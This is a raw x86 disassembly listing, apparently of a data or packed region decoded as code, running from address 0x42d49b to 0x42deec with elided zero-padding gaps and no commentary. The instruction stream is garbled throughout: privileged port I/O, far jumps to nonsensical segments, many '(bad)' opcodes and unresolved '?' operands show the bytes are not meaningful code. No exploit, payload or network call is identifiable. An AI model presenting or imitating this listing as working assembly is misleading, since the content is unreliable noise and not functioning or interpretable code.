  42d49b:	in     eax,dx
  42d49c:	push   ecx
  42d49d:	cmp    esp,DWORD PTR [ebp-0x1c]
  42d4a0:	jmp    0xfe2f:0x6a3eb381
  42d4a7:	xchg   eax,eax
  42d4a9:	test   edi,ebp
  42d4ab:	and    ecx,ebx
  42d4ad:	fs ret 
  42d4af:	out    dx,eax
  42d4b0:	jo     0x42d43a
  42d4b2:	ja     0x42d50c
  42d4b4:	cs jnp 0x42d513
  42d4b7:	pop    ecx
  42d4b8:	xor    esi,DWORD PTR ds:0x92d35594
  42d4be:	adc    esi,edx
  42d4c0:	cmp    DWORD PTR ds:0xcd8f5150,eax
  42d4c6:	push   ds
  42d4c7:	ins    DWORD PTR es:[edi],dx
  42d4c8:	enter  0x51da,0x3
  42d4cc:	cdq    
  42d4cd:	xchg   ecx,eax
  42d4ce:	xchg   BYTE PTR [edx+0x5492b3c4],dl
  42d4d4:	inc    esp
  42d4d5:	inc    eax
  42d4d6:	inc    esi
  42d4d7:	iret   
  42d4d8:	sbb    BYTE PTR [ecx-0x7b868355],bl
  42d4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4df:	lds    ecx,FWORD PTR [edi+0x120fd070]
  42d4e5:	stos   DWORD PTR es:[edi],eax
  42d4e6:	je     0x42d48d
  42d4e8:	mov    dh,0xb1
  42d4ea:	cmp    BYTE PTR [ebp+0x16ea8d63],bl
  42d4f0:	je     0x42d508
  42d4f2:	push   eax
  42d4f3:	jo     0x42d4ae
  42d4f5:	js     0x42d4f2
  42d4f7:	pop    es
  42d4f8:	repnz pop eax
  42d4fa:	retf   0x5d5d
  42d4fd:	lods   eax,DWORD PTR ds:[esi]
  42d4fe:	adc    esi,0x2d
  42d501:	loope  0x42d4ab
  42d503:	mov    ah,0x93
  42d505:	and    DWORD PTR ss:[edx+0x36],esp
  42d509:	mov    ch,0x4b
  42d50b:	ror    ebx,0x80
  42d50e:	pop    es
  42d50f:	ret    0x2e72
  42d512:	loop   0x42d568
  42d514:	inc    esi
  42d515:	inc    ebp
  42d516:	push   ebp
  42d517:	out    dx,al
  42d518:	fxch   st(5)
  42d51a:	aad    0x52
  42d51c:	jns    0x42d56a
  42d51e:	add    DWORD PTR [esp+ecx*8-0x3f351ca5],edx
  42d525:	imul   edx,DWORD PTR [ebx+ecx*2-0x72],0xf0ef062f
  42d52d:	pop    ds
  42d52e:	jmp    DWORD PTR [edx+0x60]
  42d531:	into   
  42d532:	rol    DWORD PTR [esi],0xaf
  42d535:	mov    esp,0x3af5e530
  42d53a:	mov    cl,0xcd
  42d53c:	fcomp  DWORD PTR ds:0x6797cf06
	...
  42d5b2:	add    BYTE PTR [eax],al
  42d5b4:	pop    ebp
  42d5b5:	dec    eax
  42d5b6:	jle    0x42d546
  42d5b8:	jg     0x42d578
  42d5ba:	std    
  42d5bb:	fld    TBYTE PTR [edi]
  42d5bd:	cmp    BYTE PTR [ebp-0x50],bl
  42d5c0:	pop    ecx
  42d5c1:	and    BYTE PTR [edx-0x74],ah
  42d5c4:	pop    edx
  42d5c5:	loopne 0x42d5c8
  42d5c7:	add    dh,dh
  42d5c9:	add    BYTE PTR [eax],al
  42d5cb:	add    dl,cl
  42d5cd:	mov    edi,0x9d74c737
  42d5d2:	or     al,BYTE PTR [eax-0x2f]
  42d5d5:	cli    
  42d5d6:	add    eax,0xc1a79d0d
  42d5db:	mov    ebp,?
  42d5dd:	pop    ebx
  42d5de:	push   ebp
  42d5df:	jo     0x42d5e3
  42d5e1:	lods   eax,DWORD PTR ds:[esi]
  42d5e2:	retf   
  42d5e3:	mov    cl,0xf1
  42d5e5:	sbb    eax,edi
  42d5e7:	cmp    al,0x85
  42d5e9:	pop    ds
  42d5ea:	cld    
  42d5eb:	mov    DWORD PTR [ebp+0x5d],edx
  42d5ee:	arpl   WORD PTR [eax],di
  42d5f0:	stos   DWORD PTR es:[edi],eax
  42d5f1:	fwait
  42d5f2:	ja     0x42d630
  42d5f4:	mov    al,0x82
  42d5f6:	pop    ebx
  42d5f7:	push   esi
  42d5f8:	push   cs
  42d5f9:	loopne 0x42d622
  42d5fb:	adc    bh,al
  42d5fd:	xchg   esi,eax
  42d5fe:	call   0xf3ad3b78
  42d603:	inc    ecx
  42d604:	or     BYTE PTR [edi],ch
  42d606:	nop    DWORD PTR ds:0x46bcb069
  42d60d:	lods   eax,DWORD PTR ds:[esi]
  42d60e:	ret    0x3b47
  42d611:	dec    eax
  42d612:	sti    
  42d613:	or     BYTE PTR [ecx-0x48c84f5e],0xb6
  42d61a:	icebp  
  42d61b:	out    0xf0,al
  42d61d:	scas   eax,DWORD PTR es:[edi]
  42d61e:	mov    al,0xe0
  42d620:	imul   ecx,DWORD PTR ds:0x702f980e,0x6f
  42d627:	xor    DWORD PTR [edi],ecx
  42d629:	and    esi,DWORD PTR [ecx-0x19]
  42d62c:	pop    ss
  42d62d:	(bad)  [edi]
  42d62f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d630:	inc    edx
  42d631:	inc    ebx
  42d632:	arpl   WORD PTR [edx+0x42],di
  42d635:	fld    DWORD PTR [ebp+0x24]
  42d638:	cmp    DWORD PTR [eax],edi
  42d63a:	rcl    DWORD PTR [ebp+0x35],cl
  42d63d:	xchg   ecx,eax
  42d63e:	ins    DWORD PTR es:[edi],dx
  42d63f:	dec    eax
  42d640:	clc    
  42d641:	pusha  
  42d642:	scas   eax,DWORD PTR es:[edi]
  42d643:	jp     0x42d6b1
  42d645:	fisubr DWORD PTR [edi-0x75]
  42d648:	cmp    al,ah
  42d64a:	(bad)  
  42d64b:	stos   BYTE PTR es:[edi],al
  42d64c:	mov    ebp,0xc52b10f5
  42d651:	in     eax,0xf5
  42d653:	into   
  42d654:	imul   edx,DWORD PTR [eax+eax*8],0x95cbeb00
  42d65b:	ret    0x8fa9
  42d65e:	mov    ah,0xf3
  42d660:	and    al,0xac
  42d662:	pusha  
  42d663:	jb     0x42d69a
  42d665:	xchg   edi,eax
  42d666:	mov    eax,0x424930e4
  42d66b:	add    bl,bl
  42d66d:	jmp    0x2a941eeb
  42d672:	imul   ebp,edi,0x51
  42d675:	ins    DWORD PTR es:[edi],dx
  42d676:	test   al,0x56
  42d678:	rcr    BYTE PTR [esp+edi*4-0x22],1
  42d67c:	add    eax,0x43ea57b0
  42d681:	adc    DWORD PTR [ecx-0x70],ebp
  42d684:	xchg   ecx,eax
  42d685:	add    ah,BYTE PTR [esi-0x24]
  42d688:	shr    BYTE PTR ds:0x78597686,cl
  42d68e:	bnd jl 0x42d688
  42d691:	xchg   ecx,eax
  42d692:	test   DWORD PTR [ecx],ebp
  42d694:	ins    BYTE PTR es:[edi],dx
  42d695:	sub    eax,0x8ac8f671
  42d69a:	and    ch,BYTE PTR cs:[ecx-0x67]
  42d69e:	shl    edi,0x23
  42d6a1:	ds cmp al,0x29
  42d6a4:	xor    edi,DWORD PTR [edx+ecx*2+0x15d7e9de]
  42d6ab:	cmp    esp,DWORD PTR [esi-0x2d]
  42d6ae:	pop    eax
  42d6af:	hlt    
  42d6b0:	jno    0x42d6f0
  42d6b2:	aad    0xa8
  42d6b4:	outs   dx,DWORD PTR ds:[esi]
  42d6b5:	outs   dx,DWORD PTR ds:[esi]
  42d6b6:	or     eax,0x575eee2c
  42d6bb:	sbb    eax,0xbf6a7007
  42d6c0:	aad    0x2e
	...
  42d732:	add    BYTE PTR [eax],al
  42d734:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42d73a:	jmp    FWORD PTR [ebp-0x78eb318b]
  42d740:	test   al,0xc9
  42d742:	sub    al,0x41
  42d744:	push   eax
  42d745:	loope  0x42d748
  42d747:	add    dh,dh
  42d749:	add    BYTE PTR [eax],al
  42d74b:	add    BYTE PTR [esi+eax*4],dh
  42d74e:	out    0x4f,al
  42d750:	(bad)  
  42d751:	rcr    BYTE PTR [esi],1
  42d753:	push   eax
  42d754:	pushf  
  42d755:	mov    al,0x3f
  42d757:	inc    esp
  42d758:	push   es
  42d759:	enter  0x5f34,0x1a
  42d75d:	xchg   BYTE PTR [eax],bh
  42d75f:	dec    esp
  42d760:	push   esi
  42d761:	test   al,0x39
  42d763:	push   ecx
  42d764:	dec    edi
  42d765:	fcmovnb st,st(6)
  42d767:	into   
  42d768:	or     ch,bl
  42d76a:	xor    DWORD PTR [eax+0x199c48a2],0x1ea1e6c1
  42d774:	xor    eax,0x4d99ad61
  42d779:	ss add al,0xcb
  42d77c:	ffreep st(5)
  42d77e:	pop    ds
  42d77f:	into   
  42d780:	add    ebp,esi
  42d782:	mov    dh,0x12
  42d784:	rcl    BYTE PTR [edi+eiz*4-0xb69194b],1
  42d78b:	jmp    FWORD PTR [ebx-0x4f]
  42d78e:	call   0x82a7:0xe2658ce3
  42d795:	mov    ds:0x12222a31,al
  42d79a:	push   ebx
  42d79b:	pop    es
  42d79c:	hlt    
  42d79d:	loope  0x42d7dd
  42d79f:	and    BYTE PTR [eax+0x0],ah
  42d7a2:	sbb    al,0x46
  42d7a4:	jne    0x42d757
  42d7a6:	mov    bh,0x26
  42d7a8:	in     al,dx
  42d7a9:	mov    esi,?
  42d7ab:	jp     0x42d734
  42d7ad:	loope  0x42d81e
  42d7af:	fwait
  42d7b0:	mov    bl,0x19
  42d7b2:	call   0x35fc7590
  42d7b7:	ret    0xdf18
  42d7ba:	jmp    0x42d775
  42d7bc:	into   
  42d7bd:	shl    edx,cl
  42d7bf:	jmp    DWORD PTR [ebx]
  42d7c1:	inc    ebx
  42d7c2:	pop    ss
  42d7c3:	imul   BYTE PTR [ebx-0x2]
  42d7c6:	aaa    
  42d7c7:	xor    ebx,ebx
  42d7c9:	test   al,0xf5
  42d7cb:	sub    eax,0x1afd9176
  42d7d0:	lock sub BYTE PTR [ebx+edi*4],dh
  42d7d4:	push   0xffffffd5
  42d7d6:	mov    eax,0x1217e56d
  42d7db:	stos   DWORD PTR es:[edi],eax
  42d7dc:	cli    
  42d7dd:	sbb    ecx,ecx
  42d7df:	or     ebx,DWORD PTR [edx-0x19aed783]
  42d7e5:	rcr    BYTE PTR [edi-0x603cb3f],cl
  42d7eb:	stos   BYTE PTR es:[edi],al
  42d7ec:	out    0x13,eax
  42d7ee:	and    edx,edi
  42d7f0:	adc    BYTE PTR [ebx+0x78],al
  42d7f3:	sub    eax,0x244190bc
  42d7f8:	lock ins DWORD PTR es:[edi],dx
  42d7fa:	outs   dx,DWORD PTR ds:[esi]
  42d7fb:	mov    esi,0x739ffd10
  42d800:	stc    
  42d801:	pop    ss
  42d802:	lods   al,BYTE PTR ds:[esi]
  42d803:	mov    ch,0xeb
  42d805:	inc    ecx
  42d806:	into   
  42d807:	stc    
  42d808:	aam    0x3c
  42d80a:	push   cs
  42d80b:	int3   
  42d80c:	in     al,dx
  42d80d:	pop    eax
  42d80e:	push   edx
  42d80f:	idiv   dl
  42d811:	in     eax,dx
  42d812:	pop    edi
  42d813:	lock std 
  42d815:	sub    BYTE PTR [ecx],dl
  42d817:	scas   al,BYTE PTR es:[edi]
  42d818:	data16 (bad) 
  42d81a:	in     al,0x41
  42d81c:	dec    esi
  42d81d:	test   BYTE PTR ds:0x336c74fc,0x58
  42d824:	adc    BYTE PTR [eax-0x2fde6e63],bh
  42d82a:	sub    al,ah
  42d82c:	add    bh,0xa4
  42d82f:	das    
  42d830:	mov    WORD PTR [edi],cs
  42d832:	enter  0x6dd2,0x34
  42d836:	(bad)  [edi+0x72e404f]
  42d83c:	retf   0x2fe6
  42d83f:	adc    BYTE PTR [edx],bh
  42d841:	xor    BYTE PTR [eax],al
	...
  42d8b3:	add    BYTE PTR [eax],dl
  42d8b5:	sbb    ecx,ecx
  42d8b7:	jmp    0xfb73d487
  42d8bc:	mov    edx,0x7adcc254
  42d8c1:	dec    ecx
  42d8c2:	aam    0x7
  42d8c4:	inc    esi
  42d8c5:	loop   0x42d8c8
  42d8c7:	add    dh,dh
  42d8c9:	add    BYTE PTR [eax],al
  42d8cb:	add    BYTE PTR [ebx-0x70abd49c],cl
  42d8d1:	xchg   ecx,eax
  42d8d2:	loope  0x42d899
  42d8d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8d5:	dec    ebp
  42d8d6:	and    eax,0xb1311155
  42d8db:	(bad)  
  42d8dc:	test   al,0x21
  42d8de:	mov    ?,eax
  42d8e0:	dec    esi
  42d8e1:	jno    0x42d8e3
  42d8e3:	mov    ah,BYTE PTR [ebx*2-0x45a42916]
  42d8ea:	imul   ecx,DWORD PTR [esi-0x71],0x1fdd228a
  42d8f1:	xor    ecx,DWORD PTR ds:0xedd85bdc
  42d8f7:	sahf   
  42d8f8:	and    al,0xfa
  42d8fa:	sbb    al,0x60
  42d8fc:	fisub  WORD PTR [ecx+0xe16e53f]
  42d902:	sbb    eax,0xcba5fc24
  42d907:	test   al,0x31
  42d909:	push   esi
  42d90a:	fsubr  DWORD PTR [edx]
  42d90c:	dec    ebx
  42d90d:	data16 dec bl
  42d910:	jb     0x42d974
  42d912:	jmp    0x42d92a
  42d914:	outs   dx,DWORD PTR ds:[esi]
  42d915:	jno    0x42d94d
  42d917:	(bad)  
  42d918:	aam    0xf2
  42d91a:	loope  0x42d940
  42d91c:	arpl   WORD PTR [esp+eiz*4],si
  42d91f:	add    eax,0x92d19136
  42d924:	adc    eax,0xb2e7de44
  42d929:	sub    BYTE PTR [ebp+ecx*1-0x50],0xa0
  42d92e:	sbb    DWORD PTR ds:0xfafe89c,esi
  42d934:	ja     0x42d8fd
  42d936:	sub    cl,BYTE PTR [edi]
  42d938:	(bad)  
  42d939:	stos   DWORD PTR es:[edi],eax
  42d93a:	jmp    0xe3b36558
  42d93f:	xor    al,0x90
  42d941:	lea    edi,[ebx+0x56]
  42d944:	jb     0x42d949
  42d946:	out    0x15,eax
  42d948:	sub    BYTE PTR [ecx],cl
  42d94a:	test   eax,0xad0b80ef
  42d94f:	ins    DWORD PTR es:[edi],dx
  42d950:	pop    di
  42d952:	jmp    0x3d3c1964
  42d957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d958:	xor    al,0x25
  42d95a:	mov    dh,0x1b
  42d95c:	jne    0x42d947
  42d95e:	push   ds
  42d95f:	aas    
  42d960:	pop    ebp
  42d961:	outs   dx,DWORD PTR ds:[esi]
  42d962:	xchg   ebp,eax
  42d963:	lock dec esi
  42d965:	sbb    BYTE PTR [esi+0x24],dl
  42d968:	test   al,0x21
  42d96a:	xor    BYTE PTR [ebx-0x82106d2],ah
  42d970:	sar    cl,1
  42d972:	mov    edi,0x8c7ed683
  42d977:	clc    
  42d978:	inc    esi
  42d979:	pop    ecx
  42d97a:	dec    ebx
  42d97b:	test   al,0x61
  42d97d:	dec    esi
  42d97e:	ins    BYTE PTR es:[edi],dx
  42d97f:	ret    
  42d980:	sub    ah,BYTE PTR [esi-0x50]
  42d983:	cmp    DWORD PTR [ecx-0x7f],ebp
  42d986:	jl     0x42d908
  42d988:	fdiv   DWORD PTR [edx-0x78]
  42d98b:	aad    0xeb
  42d98d:	mov    WORD PTR [eax],?
  42d98f:	cwde   
  42d990:	jnp    0x42d9a8
  42d992:	shl    BYTE PTR [ecx-0x63a47d49],1
  42d998:	imul   esi
  42d99a:	in     al,0xe6
  42d99c:	sub    dl,BYTE PTR [eax]
  42d99e:	inc    esp
  42d99f:	mov    ebx,0x3fb5cac2
  42d9a4:	jno    0x42da05
  42d9a6:	out    dx,al
  42d9a7:	fidiv  WORD PTR [eax+0x21d2b494]
  42d9ad:	inc    ecx
  42d9ae:	fsub   DWORD PTR [eax-0x7b48a3b]
  42d9b4:	add    al,0x43
  42d9b6:	mov    ah,0xc
  42d9b8:	popf   
  42d9b9:	jp     0x42d9dd
  42d9bb:	sub    ebp,edx
  42d9bd:	inc    esp
  42d9be:	adc    ebx,DWORD PTR [bx+di]
  42d9c1:	xchg   esp,eax
	...
  42da32:	add    BYTE PTR [eax],al
  42da34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da35:	fimul  DWORD PTR [eax-0x10ac02bf]
  42da3b:	(bad)  
  42da3c:	jp     0x42da02
  42da3e:	dec    edi
  42da3f:	(bad)  
  42da40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da41:	std    
  42da42:	popf   
  42da43:	cmp    DWORD PTR [ebx+eiz*8],0xf60001
  42da4a:	add    BYTE PTR [eax],al
  42da4c:	jp     0x42da7b
  42da4e:	pop    ebp
  42da4f:	test   al,0x38
  42da51:	ror    BYTE PTR [ebp+0x15a6e56],1
  42da57:	(bad)
  42da5a:	cmc    
  42da5b:	xchg   BYTE PTR [esi-0x77],ah
  42da5e:	pushf  
  42da5f:	add    DWORD PTR [edx+0x14],esi
  42da62:	jno    0x42da2a
  42da64:	fbstp  TBYTE PTR [ebp+0x58]
  42da67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da68:	inc    esp
  42da69:	xchg   BYTE PTR [esi],bl
  42da6b:	outs   dx,BYTE PTR ds:[esi]
  42da6c:	in     al,0x13
  42da6e:	jnp    0x42da4e
  42da70:	mov    ebx,0x7e945e82
  42da75:	iret   
  42da76:	push   ebx
  42da77:	(bad)  
  42da78:	cmp    bh,BYTE PTR [esi+0x64456ffd]
  42da7e:	push   ebp
  42da7f:	sar    bh,0xe1
  42da82:	lea    edi,[ecx+0x55]
  42da85:	stos   BYTE PTR es:[edi],al
  42da86:	je     0x42da7e
  42da88:	mov    ah,0xd0
  42da8a:	or     bh,BYTE PTR [esi]
  42da8c:	(bad)
  42da8f:	retw   
  42da91:	scas   eax,DWORD PTR es:[edi]
  42da92:	imul   ebx,ebx,0x4d
  42da95:	les    esp,FWORD PTR [ebx-0x149d577f]
  42da9b:	(bad)  
  42da9c:	dec    ebp
  42da9d:	stos   DWORD PTR es:[edi],eax
  42da9e:	jae    0x42da61
  42daa0:	cmc    
  42daa1:	ret    0x9f49
  42daa4:	sbb    bl,dl
  42daa6:	xchg   ecx,eax
  42daa7:	dec    edx
  42daa8:	leave  
  42daa9:	call   0xc8a9:0xf4e5535e
  42dab0:	gs mov ebx,0xcd1231b9
  42dab6:	mov    dl,0xd4
  42dab8:	dec    eax
  42dab9:	mov    bh,ah
  42dabb:	adc    DWORD PTR [ecx+eiz*1+0xc],esp
  42dabf:	mov    al,0x8c
  42dac1:	cs inc eax
  42dac3:	es dec ecx
  42dac5:	retf   0xc825
  42dac8:	cli    
  42dac9:	mov    dh,0xdf
  42dacb:	push   ebx
  42dacc:	sub    BYTE PTR [esp+edi*4],bl
  42dacf:	setns  BYTE PTR [edi-0x5edd331f]
  42dad6:	popf   
  42dad7:	ret    0x2298
  42dada:	shr    BYTE PTR [edx+ebp*2+0x0],0xf7
  42dadf:	rcr    esi,cl
  42dae1:	sbb    cl,BYTE PTR ds:0x62c03e44
  42dae7:	les    eax,FWORD PTR [ebx]
  42dae9:	clc    
  42daea:	scas   eax,DWORD PTR es:[edi]
  42daeb:	minps  xmm2,XMMWORD PTR [eax+ecx*8+0x33]
  42daf0:	ret    0x5bb6
  42daf3:	add    DWORD PTR [edi-0x5874cb51],ecx
  42daf9:	out    dx,eax
  42dafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dafb:	popa   
  42dafc:	jbe    0x42da8f
  42dafe:	push   edi
  42daff:	out    0x48,eax
  42db01:	dec    ebx
  42db02:	ss out dx,eax
  42db04:	push   es
  42db05:	push   ecx
  42db06:	out    dx,eax
  42db07:	sbb    DWORD PTR [eax+0x76],0xa1734744
  42db0e:	sahf   
  42db0f:	(bad)  
  42db10:	rcl    al,0x18
  42db13:	lods   al,BYTE PTR ds:[esi]
  42db14:	and    eax,DWORD PTR [edx-0x63]
  42db17:	lea    ebx,[edx]
  42db19:	mov    ecx,0xf54e78e4
  42db1e:	inc    esp
  42db1f:	data16 loope 0x42db3f
  42db22:	lods   al,BYTE PTR ds:[esi]
  42db23:	sbb    BYTE PTR [eax+0x68],0xf2
  42db27:	mov    edx,0xce6ff93d
  42db2c:	push   0x4a45ffcd
  42db31:	test   BYTE PTR [ecx],dh
  42db33:	test   eax,0xc904bed
  42db38:	rdmsr  
  42db3a:	rcr    DWORD PTR [eax-0x4134f33d],0x7
  42db41:	sbb    al,0x0
	...
  42dbb3:	add    BYTE PTR [edi+0x2],bh
  42dbb6:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42dbba:	call   FWORD PTR [ebx]
  42dbbc:	(bad)  
  42dbbd:	mov    fs:0xaffc6937,al
  42dbc3:	(bad)  
  42dbc4:	xor    ah,ah
  42dbc6:	add    DWORD PTR [eax],eax
  42dbc8:	test   BYTE PTR [eax],0x0
  42dbcb:	add    BYTE PTR [ecx-0x35],bh
  42dbce:	add    BYTE PTR [edi+0x50],cl
  42dbd1:	lods   al,BYTE PTR ds:[esi]
  42dbd2:	rcl    DWORD PTR ds:0x2a30d52b,0xec
  42dbd9:	inc    edi
  42dbda:	ret    
  42dbdb:	retf   0xd689
  42dbde:	mov    al,0x5d
  42dbe0:	jo     0x42dbc6
  42dbe2:	dec    edi
  42dbe3:	out    dx,al
  42dbe4:	js     0x42dbca
  42dbe6:	(bad)  
  42dbe8:	jecxz  0x42dc2c
  42dbea:	sub    BYTE PTR [ebp+0xb],al
  42dbed:	mov    dh,0x39
  42dbef:	push   ds
  42dbf0:	cmc    
  42dbf1:	adc    DWORD PTR [edx-0x2c],edi
  42dbf4:	out    dx,al
  42dbf5:	push   esi
  42dbf6:	adc    al,0x9
  42dbf8:	push   edx
  42dbf9:	add    eax,0x5b938ef2
  42dbfe:	retf   
  42dbff:	pop    ds
  42dc00:	mov    ebx,0xcb6c5848
  42dc05:	cmp    al,bl
  42dc07:	inc    edx
  42dc08:	aas    
  42dc09:	or     al,0xa4
  42dc0b:	daa    
  42dc0c:	mov    ebp,ebp
  42dc0e:	cmp    ebp,DWORD PTR [edx-0x1251eebb]
  42dc14:	test   BYTE PTR [esi+0x12],al
  42dc17:	mov    dh,0xea
  42dc19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc1a:	rcr    DWORD PTR ds:0x47c4cf87,1
  42dc20:	xor    eax,0xfb8a28b
  42dc25:	jg     0x42dc14
  42dc27:	jmp    0xaad0:0x60585f0b
  42dc2e:	adc    DWORD PTR [ebx],esi
  42dc30:	sbb    ch,bh
  42dc32:	in     eax,dx
  42dc33:	adc    BYTE PTR [edx-0x5b27a59c],ch
  42dc39:	in     al,dx
  42dc3a:	mov    al,0xf
  42dc3c:	mov    ds:0xa447a342,al
  42dc41:	cld    
  42dc42:	mov    al,0x8d
  42dc44:	xchg   ecx,eax
  42dc45:	or     al,0x60
  42dc47:	xchg   BYTE PTR [ebp-0x70f1c8c9],dl
  42dc4d:	aam    0x7d
  42dc4f:	jecxz  0x42dc5f
  42dc51:	ret    
  42dc52:	sbb    eax,DWORD PTR [edi]
  42dc54:	add    edx,DWORD PTR [esi-0xe01b6e]
  42dc5a:	jmp    0x42dbfa
  42dc5c:	(bad)  
  42dc5d:	loopne 0x42dc99
  42dc5f:	lods   eax,DWORD PTR ds:[esi]
  42dc60:	aam    0x9
  42dc62:	adc    BYTE PTR [esi-0x23fd0cee],dh
  42dc68:	xchg   ecx,eax
  42dc69:	and    ch,cl
  42dc6b:	das    
  42dc6c:	std    
  42dc6d:	jns    0x42dc35
  42dc6f:	repz push edi
  42dc71:	(bad)  
  42dc72:	mul    BYTE PTR [edx]
  42dc74:	fwait
  42dc75:	mov    dl,0xd8
  42dc77:	sub    BYTE PTR [ebp-0x60],0x3a
  42dc7b:	jae    0x42dcb6
  42dc7d:	sbb    BYTE PTR [eax-0x4b21e387],dh
  42dc83:	xchg   ecx,eax
  42dc84:	and    DWORD PTR [esi+0x46],ebp
  42dc87:	jb     0x42dcfe
  42dc89:	jle    0x42dcd5
  42dc8b:	sub    dl,BYTE PTR [eax-0x70]
  42dc8e:	mov    ebx,0xd9c52505
  42dc93:	jb     0x42dc26
  42dc95:	add    al,0x10
  42dc97:	dec    edi
  42dc98:	(bad)  
  42dc99:	mov    edi,?
  42dc9b:	mov    ebx,0xe003fd4
  42dca0:	push   0x367e068e
  42dca5:	or     cl,BYTE PTR [edx+ebp*8]
  42dca8:	push   eax
  42dca9:	fbstp  TBYTE PTR [eax]
  42dcab:	sbb    al,0x6
  42dcad:	add    bh,BYTE PTR [ebx]
  42dcaf:	test   DWORD PTR [edx-0x2e71f4b],edi
  42dcb5:	add    DWORD PTR [eax-0x54bb7c53],ecx
  42dcbb:	xchg   ebx,eax
  42dcbc:	sbb    eax,0x1e9a7382
  42dcc1:	xor    BYTE PTR [eax],al
	...
  42dd33:	add    BYTE PTR [ecx],bl
  42dd35:	mov    eax,ds:0xdffe87fe
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x2f325950]
  42dd44:	sub    ch,ah
  42dd46:	add    DWORD PTR [eax],eax
  42dd48:	test   BYTE PTR [eax],0x0
  42dd4b:	add    BYTE PTR [eax+0x2b],ch
  42dd4e:	jb     0x42dceb
  42dd50:	xor    al,0x14
  42dd52:	nop
  42dd53:	or     BYTE PTR [ecx+0x7ae566be],dh
  42dd59:	mov    bh,dh
  42dd5b:	popf   
  42dd5c:	mov    eax,edx
  42dd5e:	adc    ah,BYTE PTR [eax+0x4dbb76dc]
  42dd64:	pushf  
  42dd65:	fnstcw WORD PTR ds:0x2a3a9c7a
  42dd6b:	and    cl,bl
  42dd6d:	(bad)  
  42dd6e:	or     BYTE PTR [eax],ch
  42dd70:	(bad)  
  42dd71:	std    
  42dd72:	mov    eax,ds:0x7f8e3879
  42dd77:	fwait
  42dd78:	mul    DWORD PTR [edi+0x4aba8617]
  42dd7e:	fistp  DWORD PTR [ebx-0x558d586a]
  42dd84:	iret   
  42dd85:	pop    ebx
  42dd86:	aad    0xbd
  42dd88:	ds jge 0x42ddfb
  42dd8b:	loop   0x42dd79
  42dd8d:	test   bl,al
  42dd8f:	out    dx,al
  42dd90:	and    ah,BYTE PTR [eax-0x23]
  42dd93:	imul   edi,DWORD PTR [edx],0x78a95164
  42dd99:	push   edx
  42dd9a:	clc    
  42dd9b:	pop    edx
  42dd9c:	sar    DWORD PTR [ecx-0x43ec00dd],cl
  42dda2:	dec    ebx
  42dda3:	sbb    ebx,DWORD PTR [edi]
  42dda5:	std    
  42dda6:	pop    edi
  42dda7:	cwde   
  42dda8:	xor    DWORD PTR [ecx+0x55],esp
  42ddab:	pushf  
  42ddac:	jmp    FWORD PTR [ebx]
  42ddae:	in     eax,0x6a
  42ddb0:	mov    ebp,0x9bd7adb1
  42ddb5:	div    BYTE PTR [ebx+0x4b]
  42ddb8:	push   esp
  42ddb9:	mov    bl,0x7e
  42ddbb:	mov    esi,0xbdfc3d9a
  42ddc0:	shl    DWORD PTR [eax],0xf3
  42ddc3:	adc    DWORD PTR [ebx-0x23f60616],esi
  42ddc9:	icebp  
  42ddca:	fdivr  DWORD PTR [ebx]
  42ddcc:	js     0x42ddb7
  42ddce:	adc    ecx,ebx
  42ddd0:	cmp    BYTE PTR [esi+0x27],ah
  42ddd3:	fs (bad) 
  42ddd5:	in     eax,0x99
  42ddd7:	add    al,0xa7
  42ddd9:	adc    dl,BYTE PTR [ebx]
  42dddb:	mov    ds,WORD PTR [edx-0x61c47265]
  42dde1:	js     0x42de08
  42dde3:	push   ebx
  42dde4:	mov    es,WORD PTR [eax+0xe4273bc]
  42ddea:	data16 cmp cl,al
  42dded:	jno    0x42ddc3
  42ddef:	ficomp WORD PTR [ebp+0x5a640eee]
  42ddf5:	xchg   ebp,eax
  42ddf6:	add    ch,BYTE PTR [edi]
  42ddf8:	mov    ch,0x46
  42ddfa:	mov    es,WORD PTR [edi+0x78d6eb2d]
  42de00:	stos   DWORD PTR es:[edi],eax
  42de01:	sahf   
  42de02:	inc    DWORD PTR [esi-0x35ca4f57]
  42de08:	jo     0x42ddd7
  42de0a:	icebp  
  42de0b:	enter  0x28e5,0x3a
  42de0f:	and    esi,DWORD PTR [ecx+0x4d2cfb70]
  42de15:	ret    
  42de16:	lds    esi,FWORD PTR [ebp+0x3fdaf91e]
  42de1c:	or     al,0xb5
  42de1e:	and    al,0x45
  42de20:	and    DWORD PTR [ebp-0xe],esi
  42de23:	mov    ch,bl
  42de25:	retf   0x8c74
  42de28:	jecxz  0x42ddcc
  42de2a:	in     al,dx
  42de2b:	xor    eax,0xc680d41c
  42de30:	xor    eax,0xdafbbeb6
  42de35:	dec    edi
  42de36:	ffreep st(4)
  42de38:	lahf   
  42de39:	mov    bh,0xaf
  42de3b:	push   ebp
  42de3c:	hlt    
  42de3d:	fsub   DWORD PTR [ecx]
  42de3f:	push   esp
  42de40:	test   BYTE PTR [edx+0x0],ch
	...
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0xc00210c]
  42dec3:	loope  0x42dee3
  42dec5:	out    0x1,al
  42dec7:	add    dh,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ebx-0x4],dl
  42dece:	arpl   WORD PTR [ecx+ecx*8+0x7538d055],si
  42ded5:	xor    al,0x3a
  42ded7:	sub    BYTE PTR [edx],bh
  42ded9:	shl    BYTE PTR [esi-0x14f88ec5],1
  42dedf:	ret    
  42dee0:	mov    al,ds:0x2d2e1cb2
  42dee5:	and    ch,BYTE PTR [si]
  42dee8:	scas   al,BYTE PTR es:[edi]
  42dee9:	pop    edx
  42deea:	icebp  
  42deeb:	out    dx,eax
  42deec:	ret    
